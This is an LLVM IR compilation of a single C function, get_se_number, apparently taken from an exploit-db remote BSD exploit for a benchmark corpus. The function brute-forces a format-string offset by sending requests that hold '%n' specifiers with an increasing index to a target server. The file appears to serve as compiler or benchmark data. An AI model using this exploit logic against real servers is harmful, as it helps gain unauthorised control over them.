; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_get_se_number.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_432.c_get_se_number.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BIGBUF = common dso_local global i32 0, align 4
@START_BRUTEFORCE_SAVED_EBP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"sm00ny\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"%%%d$n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @get_se_number(i32 %0, i32 %1, i8* %2, i32 %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %20 = load i32, i32* @BIGBUF, align 4
  %21 = zext i32 %20 to i64
  %22 = call i8* @llvm.stacksave()
  store i8* %22, i8** %11, align 8
  %23 = alloca i8, i64 %21, align 16
  store i64 %21, i64* %12, align 8
  %24 = load i32, i32* @BIGBUF, align 4
  %25 = zext i32 %24 to i64
  %26 = alloca i8, i64 %25, align 16
  store i64 %25, i64* %13, align 8
  %27 = load i32, i32* @BIGBUF, align 4
  %28 = zext i32 %27 to i64
  %29 = alloca i8, i64 %28, align 16
  store i64 %28, i64* %17, align 8
  %30 = load i32, i32* %6, align 4
  %31 = icmp ne i32 %30, 0
  br i1 %31, label %34, label %32

32:                                               ; preds = %4
  %33 = load i32, i32* @START_BRUTEFORCE_SAVED_EBP, align 4
  store i32 %33, i32* %6, align 4
  br label %34

34:                                               ; preds = %32, %4
  %35 = load i32, i32* %6, align 4
  store i32 %35, i32* %10, align 4
  br label %36

36:                                               ; preds = %65, %34
  %37 = load i32, i32* %10, align 4
  %38 = load i32, i32* %7, align 4
  %39 = icmp slt i32 %37, %38
  br i1 %39, label %40, label %68

40:                                               ; preds = %36
  %41 = load i8*, i8** %8, align 8
  %42 = load i32, i32* %9, align 4
  %43 = call i32 @connect_to(i8* %41, i32 %42)
  store i32 %43, i32* %18, align 4
  %44 = load i32, i32* %18, align 4
  %45 = trunc i64 %28 to i32
  %46 = call i32 @recv(i32 %44, i8* %29, i32 %45, i32 0)
  store i32 %46, i32* %16, align 4
  %47 = call i32 (i8*, i8*, ...) @sprintf(i8* %26, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  %48 = load i32, i32* %10, align 4
  %49 = call i32 (i8*, i8*, ...) @sprintf(i8* %23, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0), i32 %48)
  %50 = call i8* @get_request(i8* %23, i8* %26)
  store i8* %50, i8** %14, align 8
  %51 = load i32, i32* %18, align 4
  %52 = load i8*, i8** %14, align 8
  %53 = call i32 @send_data(i32 %51, i8* %52)
  %54 = trunc i64 %28 to i32
  %55 = call i32 @memset(i8* %29, i32 0, i32 %54)
  %56 = load i32, i32* %18, align 4
  %57 = trunc i64 %28 to i32
  %58 = call i32 @recv(i32 %56, i8* %29, i32 %57, i32 0)
  store i32 %58, i32* %16, align 4
  %59 = load i32, i32* %18, align 4
  %60 = call i32 @close_socket(i32 %59)
  %61 = load i32, i32* %16, align 4
  %62 = icmp sgt i32 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %40
  br label %68

64:                                               ; preds = %40
  br label %65

65:                                               ; preds = %64
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %10, align 4
  br label %36

68:                                               ; preds = %63, %36
  %69 = load i32, i32* %10, align 4
  %70 = load i32, i32* %7, align 4
  %71 = icmp eq i32 %69, %70
  br i1 %71, label %72, label %73

72:                                               ; preds = %68
  store i32 -1, i32* %5, align 4
  store i32 1, i32* %19, align 4
  br label %75

73:                                               ; preds = %68
  %74 = load i32, i32* %10, align 4
  store i32 %74, i32* %5, align 4
  store i32 1, i32* %19, align 4
  br label %75

75:                                               ; preds = %73, %72
  %76 = load i8*, i8** %11, align 8
  call void @llvm.stackrestore(i8* %76)
  %77 = load i32, i32* %5, align 4
  ret i32 %77
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @connect_to(i8*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #2

declare dso_local i8* @get_request(i8*, i8*) #2

declare dso_local i32 @send_data(i32, i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @close_socket(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
